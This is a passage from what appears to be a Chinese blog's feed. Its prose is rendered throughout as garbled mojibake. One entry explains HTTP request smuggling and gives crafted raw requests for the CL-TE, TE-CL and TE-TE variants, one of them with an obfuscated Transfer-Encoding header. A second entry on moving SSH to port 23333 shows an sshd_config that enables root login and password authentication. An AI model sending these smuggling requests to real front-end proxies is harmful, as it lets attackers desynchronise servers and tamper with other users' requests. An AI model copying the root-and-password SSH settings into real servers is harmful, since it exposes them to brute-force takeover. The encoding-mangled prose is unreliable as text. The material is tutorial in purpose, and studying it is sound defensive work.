ä¸ºä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬ä¼šé‡ç”¨TCPè¿æ¥ã€‚æ‰€ä»¥æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚å°±æ‹¼æ¥åˆ°äº†å­—æ¯<code>a</code>çš„åé¢ï¼Œå½“åç«¯æœåŠ¡å™¨æ¥æ”¶å®Œæ¯•åï¼Œå®ƒå®é™…å¤„ç†çš„è¯·æ±‚å…¶å®æ˜¯ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aGET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶ï¼Œç”¨æˆ·å°±ä¼šæ”¶åˆ°ä¸€ä¸ªç±»ä¼¼äº<code>aGET request method not found</code>çš„æŠ¥é”™ã€‚è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡HTTPèµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯¹æ­£å¸¸ç”¨æˆ·çš„è¡Œä¸ºé€ æˆäº†å½±å“ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰©å±•æˆç±»ä¼¼äºCSRFçš„æ”»å‡»æ–¹å¼ã€‚</p><p>ä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥å—è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…ã€‚è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ<br> æ‰€ä»¥æƒ³åˆ°å‰é¢æ‰€è¯´çš„<br> <strong>RFC2616è§„èŒƒ</strong></p><blockquote><p>å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨<code>Content-Length</code>å’Œ<code>Transfer-Encoding</code>è¿™ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œåœ¨å¤„ç†çš„æ—¶å€™å¿…é¡»å¿½ç•¥<code>Content-Length</code>ã€‚</p></blockquote><p>æ‰€ä»¥è¯·æ±‚åŒ…ä¸­åŒæ—¶åŒ…å«è¿™ä¸¤ä¸ªè¯·æ±‚å¤´å¹¶ä¸ç®—è¿è§„ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸éœ€è¦è¿”å›400é”™è¯¯ã€‚å¯¼è‡´æœåŠ¡å™¨åœ¨è¿™é‡Œçš„å®ç°æ›´å®¹æ˜“å‡ºé—®é¢˜ã€‚</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TEï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµå®ˆ<code>RFC2616</code>çš„è§„å®šï¼Œå¿½ç•¥æ‰<code>Content-Length</code>ï¼Œå¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ã€‚</p><p><strong>chunkä¼ è¾“æ•°æ®(sizeçš„å€¼ç”±16è¿›åˆ¶è¡¨ç¤º)</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="hljs-number">0</span>][\r\n][\r\n]<br></code></pre></td></tr></table></figure><p><strong>chunkedç¼–ç </strong><br> å‚è€ƒï¼š<a href="https://blog.csdn.net/yankai0219/article/details/8269922">httpåè®®ä¸­content-length ä»¥åŠchunkedç¼–ç åˆ†æ</a><br> <strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>è¿ç»­å‘é€å‡ æ¬¡è¯·æ±‚å°±å¯ä»¥è·å¾—å“åº”ã€‚<br> <strong>æ”»å‡»æµç¨‹</strong>ï¼š<br> ç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>ï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å¯¹äºå®ƒæ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè¯·æ±‚ä½“çš„é•¿åº¦ä¸º6ï¼Œä¹Ÿå°±æ˜¯</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>å½“è¯·æ±‚åŒ…ç»è¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘ç»™åç«¯æœåŠ¡å™¨æ—¶ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å®ƒè¯»å–åˆ°</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>è®¤ä¸ºå·²ç»è¯»å–åˆ°ç»“å°¾äº†ã€‚<br> ä½†å‰©ä¸‹çš„å­—æ¯<code>a</code>å°±è¢«ç•™åœ¨äº†ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚å½“æˆ‘ä»¬é‡å¤å‘é€è¯·æ±‚åï¼Œå‘é€çš„è¯·æ±‚åœ¨åç«¯æœåŠ¡å™¨æ‹¼æ¥æˆäº†ç±»ä¼¼ä¸‹é¢è¿™ç§è¯·æ±‚ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨åœ¨è§£ææ—¶å°±ä¼šäº§ç”ŸæŠ¥é”™äº†ï¼Œä»è€Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CLï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ã€‚<br> <strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br> å‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å…¶è¯»å–åˆ°</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚<br> æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ï¼Œå› ä¸ºè¯·æ±‚ä½“çš„é•¿åº¦ä¸º<code>4</code>.ä¹Ÿå°±æ˜¯å½“å®ƒè¯»å–å®Œ</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>å°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p><h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TEï¼Œå½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ï¼Œç¡®å®æ˜¯å®ç°äº†RFCçš„æ ‡å‡†ã€‚ä¸è¿‡å‰åç«¯æœåŠ¡å™¨ä¸æ˜¯åŒä¸€ç§ã€‚è¿™å°±æœ‰äº†ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„<code>Transfer-Encoding</code>è¿›è¡ŒæŸç§æ··æ·†æ“ä½œ(å¦‚æŸä¸ªå­—ç¬¦æ”¹å˜å¤§å°å†™)ï¼Œä»è€Œä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ã€‚åœ¨æŸç§æ„ä¹‰ä¸Šè¿™è¿˜æ˜¯<code>CL-TE</code>æˆ–è€…<code>TE-CL</code>ã€‚<br> <strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br> å‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å…¶è¯»å–åˆ°</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–ç»“æŸã€‚<br> æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-encoding</code>è¯·æ±‚å¤´ï¼Œå°†<code>Transfer-Encoding</code>éšè—åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ª<code>chain</code>ä¸­æ—¶ï¼Œå®ƒå°†ä¼šå›é€€åˆ°ä½¿ç”¨<code>Content-Length</code>å»å‘é€è¯·æ±‚ã€‚è¯»å–åˆ°</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨é«˜ç«¯å£ssh</title>
    <link href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/"/>
    <url>/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/</url>
    
    <content type="html"><![CDATA[<h1 id="Centos7-ä½¿ç”¨-ssh-è¿æ¥ä¹‹æ”¹ç«¯å£-22"><a href="#Centos7-ä½¿ç”¨-ssh-è¿æ¥ä¹‹æ”¹ç«¯å£-22" class="headerlink" title="Centos7 ä½¿ç”¨ ssh è¿æ¥ä¹‹æ”¹ç«¯å£ 22"></a>Centos7 ä½¿ç”¨ ssh è¿æ¥ä¹‹æ”¹ç«¯å£ 22</h1><p><strong>é¢˜è®°ï¼š</strong></p><p>è¯´æ¥è´»ç¬‘å¤§æ–¹ï¼Œå¼€å§‹æ¥è§¦ ssh æ—¶è®¤ä¸º 22 ç«¯å£ä½œä¸º ssh å¸¸ç”¨ç«¯å£ï¼Œæ”¾åˆ°å…¬ç½‘ä¸Šå®¹æ˜“è¢«åˆ«äººçˆ†ç ´ï¼Œè°è®©æˆ‘ç”¨çš„æ˜¯å¼±å¯†ç å‘¢ï¼Œæˆ‘é”™äº†ï¼Œä½†æˆ‘ä¸‹æ¬¡è¿˜æ•¢å“ˆå“ˆå“ˆï¼Œå…¶å®æœ‰æ²¡æœ‰æ”¹ç«¯å£ï¼Œä½¿ç”¨å¼±å¯†ç æ˜ å°„åˆ°å…¬ç½‘æ˜¯æä¸å®‰å…¨çš„ï¼Œå¯¹æ–¹åªè¦æ‰«ä¸€æ‰«ä½ å¼€æ”¾çš„ç«¯å£ï¼Œç®€å•çš„çˆ†ç ´ä¸€ä¸‹ä½ å°±å®Œè›‹</p><p><strong>æ­£é¢˜</strong></p><h2 id="ä¸€ã€æ›´æ”¹-sshd-é…ç½®æ–‡ä»¶"><a href="#ä¸€ã€æ›´æ”¹-sshd-é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸€ã€æ›´æ”¹ sshd é…ç½®æ–‡ä»¶"></a>ä¸€ã€æ›´æ”¹ sshd é…ç½®æ–‡ä»¶</h2><p>ssh_config æ˜¯å®¢æœç«¯çš„é…ç½®æ–‡ä»¶ï¼Œè€Œ centos7 ä½œä¸ºå—ï¼Œå•Šå“ˆï¼Œå³æœåŠ¡ç«¯ï¼Œç­‰å¾…è¿æ¥çš„ï¼Œä¿®æ”¹ sshd_config</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span><br><br><span class="hljs-meta"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-meta"># sshd_config(5) for more information.</span><br><br><span class="hljs-meta"># This sshd was compiled with PATH=/usr/local/bin:/usr/bin</span><br><br><span class="hljs-meta"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-meta"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-meta"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-meta"># default value.</span><br><br><span class="hljs-meta"># If you want to change the port on a SELinux system, you have to tell</span><br><span class="hljs-meta"># SELinux about this change.</span><br><span class="hljs-meta"># semanage port -a -t ssh_port_t -p tcp #PORTNUMBER</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta">#Port 22</span><br>â­Port <span class="hljs-number">23333</span><br><span class="hljs-meta">#AddressFamily any</span><br>â­ListenAddress <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>â­ListenAddress ::<br><br>HostKey /etc/ssh/ssh_host_rsa_key<br><span class="hljs-meta">#HostKey /etc/ssh/ssh_host_dsa_key</span><br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key<br><br><span class="hljs-meta"># Ciphers and keying</span><br><span class="hljs-meta">#RekeyLimit default none</span><br><br><span class="hljs-meta"># Logging</span><br><span class="hljs-meta">#SyslogFacility AUTH</span><br>SyslogFacility AUTHPRIV<br><span class="hljs-meta">#LogLevel INFO</span><br><br><span class="hljs-meta"># Authentication:</span><br><br><span class="hljs-meta">#LoginGraceTime 2m</span><br>â­PermitRootLogin yes<br><span class="hljs-meta">#StrictModes yes</span><br><span class="hljs-meta">#MaxAuthTries 6</span><br><span class="hljs-meta">#MaxSessions 10</span><br><br><span class="hljs-meta">#PubkeyAuthentication yes</span><br><br><span class="hljs-meta"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-meta"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile      .ssh/authorized_keys<br><br><span class="hljs-meta">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-meta">#AuthorizedKeysCommand none</span><br><span class="hljs-meta">#AuthorizedKeysCommandUser nobody</span><br><br><span class="hljs-meta"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="hljs-meta">#HostbasedAuthentication no</span><br><span class="hljs-meta"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-meta"># HostbasedAuthentication</span><br><span class="hljs-meta">#IgnoreUserKnownHosts no</span><br><span class="hljs-meta"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-meta">#IgnoreRhosts yes</span><br><br><span class="hljs-meta"># To disable tunneled clear text passwords, change to no here!</span><br><span class="hljs-meta">#PasswordAuthentication yes</span><br><span class="hljs-meta">#PermitEmptyPasswords no</span><br>â­PasswordAuthentication yes<br><br><span class="hljs-meta"># Change to no to disable s/key passwords</span><br><span class="hljs-meta">#ChallengeResponseAuthentication yes</span><br>ChallengeResponseAuthentication no<br><br><span class="hljs-meta"># Kerberos options</span><br><span class="hljs-meta">#KerberosAuthentication no</span><br><span class="hljs-meta">#KerberosOrLocalPasswd yes</span><br><span class="hljs-meta">#KerberosTicketCleanup yes</span><br><span class="hljs-meta">#KerberosGetAFSToken no</span><br><span class="hljs-meta">#KerberosUseKuserok yes</span><br><br><span class="hljs-meta"># GSSAPI options</span><br>GSSAPIAuthentication yes<br>GSSAPICleanupCredentials no<br><span class="hljs-meta">#GSSAPIStrictAcceptorCheck yes</span><br><span class="hljs-meta">#GSSAPIKeyExchange no</span><br><span class="hljs-meta">#GSSAPIEnablek5users no</span><br><br><span class="hljs-meta"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="hljs-meta"># and session processing. If this is enabled, PAM authentication will</span><br><span class="hljs-meta"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="hljs-meta"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="hljs-meta"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="hljs-meta"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="hljs-meta"># If you just want the PAM account and session checks to run without</span><br><span class="hljs-meta"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="hljs-meta"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="hljs-meta"># WARNING: &#x27;UsePAM no&#x27; is not supported in Red Hat Enterprise Linux and may cause several</span><br><span class="hljs-meta"># problems.</span><br>UsePAM yes<br><br><span class="hljs-meta">#AllowAgentForwarding yes</span><br><span class="hljs-meta">#AllowTcpForwarding yes</span><br><span class="hljs-meta">#GatewayPorts no</span><br>X11Forwarding yes<br><span class="hljs-meta">#X11DisplayOffset 10</span><br><span class="hljs-meta">#X11UseLocalhost yes</span><br><span class="hljs-meta">#PermitTTY yes</span><br><span class="hljs-meta">#PrintMotd yes</span><br><span class="hljs-meta">#PrintLastLog yes</span><br><span class="hljs-meta">#TCPKeepAlive yes</span><br><span class="hljs-meta">#UseLogin no</span><br><span class="hljs-meta">#UsePrivilegeSeparation sandbox</span><br><span class="hljs-meta">#PermitUserEnvironment no</span><br><span class="hljs-meta">#Compression delayed</span><br><span class="hljs-meta">#ClientAliveInterval 0</span><br><span class="hljs-meta">#ClientAliveCountMax 3</span><br><span class="hljs-meta">#ShowPatchLevel no</span><br><span class="hljs-meta">#UseDNS yes</span><br><span class="hljs-meta">#PidFile /var/run/sshd.pid</span><br><span class="hljs-meta">#MaxStartups 10:30:100</span><br><span class="hljs-meta">#PermitTunnel no</span><br><span class="hljs-meta">#ChrootDirectory none</span><br><span class="hljs-meta">#VersionAddendum none</span><br><br><span class="hljs-meta"># no default banner path</span><br><span class="hljs-meta">#Banner none</span><br><br><span class="hljs-meta"># Accept locale-related environment variables</span><br>AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES<br>AcceptEnv LC_PAPER LC_NAME LC_ADDRESS 